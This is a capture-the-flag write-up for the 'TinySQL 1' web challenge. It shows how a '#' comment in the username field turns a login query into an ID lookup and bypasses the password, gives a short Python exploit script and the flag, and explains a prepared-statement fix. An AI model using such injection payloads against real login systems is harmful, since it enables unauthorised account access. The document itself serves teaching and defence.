# BKCTF 2026 — TinySQL 1 Writeup

**Category:** Web  
**Points:** ~200  
**Flag:** `bkctf{sql_1nj3ct10n_but_1tty_b1tty}`

---

## What is this challenge?

We get a link to a website. There is a login page. That is it. No hints, no nothing.

The description says:

> *"Can you hack this tiny database?"*

Classic CTF energy. Okay. Let's go.

---

## First Look

The login page asks for a username and password. Normal stuff. We try the basics first because we are not monsters:

- `admin:admin` → ❌
- `admin:password` → ❌
- `' OR 1=1--` → ❌

Nothing works. But we notice something — there is a download link for the source code. We open it.

This is the moment.

---

## Reading the Source Code

Inside `app.py` we find the login logic:

```python
# user lookup syntax `S:[user]:[pass]#comment`
# results = [id, user, pass]

code, results = conn.query('S:' + request.form['user'] + ':' + request.form['pass'])
```

Okay. So this is NOT regular SQL. This is a **custom database** called TinySQL. The query is just a string built by joining user input directly. No sanitization. No escaping.

This is the developer saying:

> *"I made my own database, so SQL injection can't touch me."*

![big brain](https://i.imgflip.com/1ur9b0.jpg)

Spoiler: it can.

---

## Understanding the TinySQL Protocol

Let's read the server code (`tinysql-server.py`) to understand how queries work.

There are two query formats:

```
S:username:password    →  login by username + password
S:id#comment           →  lookup by ID, everything after # is ignored
```

The `clean()` function handles comments:

```python
def clean(stmt):
    stmt = stmt.split('#')[0]   # cut everything after #
    ...
```

So the `#` character is a **comment marker**. Anything after it disappears before the query runs.

And the forum route confirms the ID lookup exists:

```python
# id lookup syntax `S:[id]#comment`
code, author = conn.query('S:' + str(post_id))
```

When there is only ONE parameter (no second `:`), the server does a lookup by ID instead of username+password.

---

## Finding the Injection

Now we connect the dots.

The login query builds this string:

```
S:[user]:[pass]
```

If we set `user = "0#"`, the query becomes:

```
S:0#:[pass]
```

The `clean()` function splits on `#`:

```
S:0#:[pass]  →  S:0
```

Everything after `#` is gone. The server now sees `S:0` — a simple **ID lookup** for user with ID 0.

ID 0 is the first user in the database. The server returns their data. Login check passes because the result has 3 fields `[id, user, pass]`.

```python
if len(results) != 3: return render_template('login.html'), 403
session['username'] = results[1]
```

We are in. With any password. Magic.

---

## The Exploit

Super simple. Two requests:

```python
import requests

s = requests.Session()

# Step 1: Login with comment injection
s.post("http://TARGET/login", data={
    "user": "0#",
    "pass": "anything_lol"
})

# Step 2: Get the flag
# post_id 3 → 3 % 4 = 3 → case 3: description = FLAG
r = s.get("http://TARGET/forum/post/3")
print(r.text)
```

Visit `/forum/post/3` and the server shows:

```python
case 3:
    title = 'flag'
    description = FLAG
```

Flag appears on screen. Done.

```
bkctf{sql_1nj3ct10n_but_1tty_b1tty}
```

---

## Why Did This Happen?

The developer thought that because they built their own database, injection attacks would not apply. But injection is not about SQL specifically — it is about **user input being mixed into a command string without sanitization**.

The same mistake. Different language. Same result.

---

## How to Fix It — Prepared Statements

The developer actually already figured this out for TinySQL 2. Here is the fix:

**Instead of building the query string directly:**

```python
# VULNERABLE ❌
code, results = conn.query('S:' + user + ':' + password)
```

**Use a prepared statement with placeholders:**

```python
# SAFE ✅
code, results = conn.prepare('S:?:?', (user, password))
```

The `prepare()` function sends the user input **separately** from the query template. The server handles them as data, never as part of the command.

Looking at how `prepare()` works in `tinysql.py`:

```python
def prepare(self, stmt, binds):
    barr = bytearray('p', 'ascii')
    barr.append(len(stmt) & self.STMT_SIZE_MASK)
    barr.extend(stmt.encode('ascii'))       # template: S:?:?

    for i in binds:
        barr.append(ord('b'))
        barr.append(len(i) & self.STMT_SIZE_MASK)
        barr.extend(i.encode('ascii'))      # user input: sent separately

    barr.append(ord('x'))                   # execute
    barr.append(0x00)
    self.sock.sendall(barr)
```

The query template `S:?:?` goes first. Then each bind value goes separately with its own length prefix. The server substitutes `?` with the actual values — but at that point the `#` character in user input is just **data**, not a comment.

If user types `0#` as their username, the server compares it literally: `user == "0#"`. No one in the database has that username. Login fails. Injection blocked.

---

## Lesson

> Custom query languages are not injection-proof.  
> The vulnerability is in string concatenation, not in SQL itself.

If user input goes into a command string — any command string — without being separated as data, it can be injected. Prepared statements fix this by keeping the structure and the data apart at all times.

---

*Written for BKCTF 2026*
